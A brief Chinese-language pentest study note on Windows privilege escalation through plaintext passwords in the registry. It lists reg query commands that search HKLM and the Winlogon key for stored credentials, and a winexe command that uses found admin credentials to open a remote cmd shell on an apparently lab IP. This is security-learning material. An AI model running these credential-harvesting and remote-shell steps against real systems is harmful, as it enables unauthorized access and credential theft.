# 注册表配置错误-储存在注册表中的密码

原理：管理员会重复使用他们的密码，或者将他们的密码留在系统上可读的位置。Windows 本身有时会将密码以明文形式存储在注册表中。

Winpeas枚举 ：参数：filesinfo（搜索可以包含凭据的文件）和 userinfo（搜索用户信息）

利用方式：

```bash
reg query HKLM /f password /t REG_SZ /s    //在注册表中搜索包含“密码”一词的键和值 ，也可用winpeas 进行枚举
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"   //查询通常位置
winexe -U 'admin%password' //10.10.116.47 cmd.exe   //在kali中直接使用winexe 
```